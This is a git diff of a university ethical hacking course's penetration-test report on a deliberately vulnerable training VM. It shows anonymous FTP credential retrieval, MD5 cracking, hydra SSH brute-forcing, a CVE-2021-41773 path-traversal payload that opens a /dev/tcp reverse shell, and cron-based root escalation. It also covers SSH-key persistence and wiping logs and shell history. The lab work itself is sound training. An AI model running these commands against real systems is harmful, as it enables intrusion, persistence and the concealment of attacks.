@@ -13,19 +13,36 @@ Group <code>0xe</code> - Owanesh, zBION1C, Frayu1600
 
 This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri for the Academic Year 23/24 at Sapienza University of Rome.
 
-We were given a virtual machine containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.
+# Statement of Confidentiality
+The contents of this document have been developed by Group 0xe.  This document may not be released to another vendor, business partner or contractor without prior
+written consent from Group 0xe. Additionally, no portion of this document may be communicated, reproduced,
+copied or distributed without the prior consent.
+The contents of this document do not constitute legal advice. The assessment
+detailed herein is against a fictional company for training and examination purposes, and the vulnerabilities in no way
+affect Group 0xe external or internal infrastructure.
 
+# Executive Summary
+Our professor Davide Guerri assigned to Group 0xe a virtual machine to perform a Penetration Test in order identify security weaknesses.
+
+# Approach
+Group 0xe performed testing under a “black box” approach May 02, 2024, to Jun 22, 2024 without
+credentials or any advance knowledge of VM internally facing environment with the goal of identifying
+unknown weaknesses. Testing was performed from a non-evasive standpoint with the goal of uncovering as many
+misconfigurations and vulnerabilities as possible. Testing was performed remotely via a host that was provisioned
+specifically for this assessment. Each weakness identified was documented and manually investigated to determine
+exploitation possibilities and escalation potential. Group 0xe sought to demonstrate the full impact of every
+vulnerability. If Group 0xe were able to gain a foothold in
+the internal network, professor allowed for further testing including lateral movement and horizontal/vertical
+privilege escalation to demonstrate the impact of an internal network compromise.
 
 # Troubleshooting
 As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sV -O -A 192.168.1.0/24
+sudo nmap -sV -O -A 192.168.1.0/24
 ```
 Even by trying to locate the machine itself by checking our ARP table, as its directly connected to us:
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ arp 
+arp 
 ```
 Which is very odd, as the machine should have obtained an ip address from the DHCP service...
 
@@ -52,8 +69,7 @@ We did **not** tamper with the machine in any other way while in recovery mode, 
 We've started from a very quick `nmap` which revealed the following output:
 
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sV -A -O 192.168.56.2
+sudo nmap -sV -A -O 192.168.56.2
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 03:40 EDT
 Nmap scan report for 192.168.56.2
@@ -110,8 +126,7 @@ Let's try establishing foothold by leveraging each path individually. We have co
 ## 🟢 via FTP
 As we have already said, above FTP allows for anonymous login, so let's do that:
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ ftp 192.168.56.2
+ftp 192.168.56.2
 
 Connected to 192.168.56.2.
 220 (vsFTPd 3.0.5)
@@ -127,13 +142,10 @@ By executing a quick `ls`, we can notice the presence of a file named `site-cred
 ```sh 
 ftp> get site-credentials.txt
 ```
-![](images/ftp_login.png)
-
 The file, which landed on `/home/kali`, reports the following:
 
 ```txt
-┌──(kali㉿kali)-[~/Downloads]
-└─$ cat site-credentials.txt 
+cat site-credentials.txt 
 
 In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password. 
 They mentioned a certain MD5 code.
@@ -146,8 +158,7 @@ Very conveniently, there is password hashed for `ftp-user` with MD5, which is a 
 We can use our trusty `JohnTheRipper` to crack the hash (which we will put inside `crack.txt` file) using the `rockyou` wordlist:
 
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 
 
 Created directory: /root/.john
 Using default input encoding: UTF-8
@@ -161,8 +172,7 @@ Session completed.
 ```
 Could `ftp-user` be an SSH user of the target machine? Let's try it:
 ```sh
-┌─(kali㉿kali)-[~]
-└─$ ssh ftp-user@192.168.56.2
+ssh ftp-user@192.168.56.2
     football
 
 ftp-user@ubuntulab:~$
@@ -198,13 +208,11 @@ Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command
 
 ```sh 
- ┌──(kali㉿kali)-[~/Desktop]
- └─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
+hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
 ```
 Which will take a long time, otherwise we could go by guessing and try the commonly used `ubuntu` username (even without seeing `/etc/passwd` from the previous path) and bruteforce off of it using the following command:
  ```sh
-┌──(kali㉿kali)-[~/Desktop]
-└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
+hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -213,8 +221,7 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 ````
 Both paths eventually lead to being able to SSH directly to the machine using username `ubuntu` and password `admin@123`
 ```sh
-┌─(kali㉿kali)-[~]
-└─$ ssh ubuntu@192.168.56.2
+ssh ubuntu@192.168.56.2
     admin@123
 
 ubuntu@ubuntulab:~$
@@ -223,15 +230,13 @@ ubuntu@ubuntulab:~$
 ## 🔴 via Apache
 From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
 ```sh
-┌──(kali㉿kali)-[~/Desktop]
-└─$ sudo nmap -sV -A 192.168.56.2 --vulners -p8080
+sudo nmap -sV -A 192.168.56.2 --vulners -p8080
 ```
 Many vulnerabilities show up, but a particular one caught our eye: CVE-2021-41773, which would allow remote code execution via path traversal. 
 
 After opening a listener on any ephemeral port on our attackbox, we managed to get a shell as the user `ftp-user` by executing the following code:
  ```sh
-┌──(kali㉿kali)-[~/Desktop]
-└─$ curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
+curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
  ```
 Which effectively executes the following `HTTP POST` request 
 ```sh 
@@ -328,8 +333,7 @@ echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache2
 ``` 
 Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ nc -lnvp 7777
+nc -lnvp 7777
 ```
 Since the file is executed as root, the shell will be a root shell.
 
@@ -347,13 +351,11 @@ root@test:~#
 # Persistence
 In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ ssh-keygen -t rsa -b 4096
+ssh-keygen -t rsa -b 4096
 ```
 Then we transfered the public key `id_rsa.pub` into the machine, we did it with `scp` but there are many ways to do it
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
+scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
 ```
 And we added its content into the `authorized_keys` file
 ```sh
@@ -414,9 +416,7 @@ truncate -s 0 /var/log/httpd
 The most stealthy approach would be to carefully remove every time anything related to us attackers shows up in them, and subsequently restoring their respective change and access dates.
 
 ## Removing bash histories
-Finally, we remove any last trace by removing every `.bash_history` file from every user so that all the commands we issued will not be seen.
+Finally, we remove any last trace by clearing traces on `history` from **every user** so that all the commands we issued will not be seen.
 ```sh
-rm ~/ftp-user/.bash_history
-rm ~/ubuntu/.bash_history
-rm ~/root/.bash_history
+history -c && history -w
 ```
